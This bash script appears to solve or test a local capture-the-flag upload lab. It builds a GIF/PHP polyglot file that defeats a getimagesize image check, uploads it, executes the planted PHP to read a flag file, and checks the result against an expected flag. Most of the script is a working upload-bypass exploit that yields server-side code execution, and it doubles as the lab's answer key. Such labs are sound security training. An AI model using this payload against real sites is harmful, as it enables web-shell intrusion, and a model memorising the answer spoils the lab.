#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")/.."

docker compose up -d --build

# Ждём готовности
for i in $(seq 1 40); do
  if curl -fsS http://localhost:8081/ >/dev/null 2>&1; then break; fi
  sleep 1
done

# Готовим polyglot: первые 2 байта "GI" -> 0x47 0x49 -> 7173 -> gif
TMP=$(mktemp --suffix=.gif)
printf 'GIF89a<?php echo file_get_contents(".flag"); ?>' > "$TMP"

# Загружаем
RESP=$(curl -s -F "upload_file=@${TMP};filename=poly.gif;type=image/gif" \
       -F "submit=上传" http://localhost:8081/index.php)

# Извлекаем путь из <img src="...">
IMG_PATH=$(echo "$RESP" | grep -oP '(?<=<img src=")[^"]+' | head -n1)

if [ -z "${IMG_PATH:-}" ]; then
  echo "FAIL: upload did not yield img src" >&2
  echo "$RESP" >&2
  docker compose down -v
  exit 1
fi

# Читаем флаг через загруженный PHP
FLAG=$(curl -s "http://localhost:8081${IMG_PATH}")

echo "$FLAG"
echo "$FLAG" | grep -q 'FLAG{upload_pass14_bypass_getimagesize}'

rm -f "$TMP"
docker compose down -v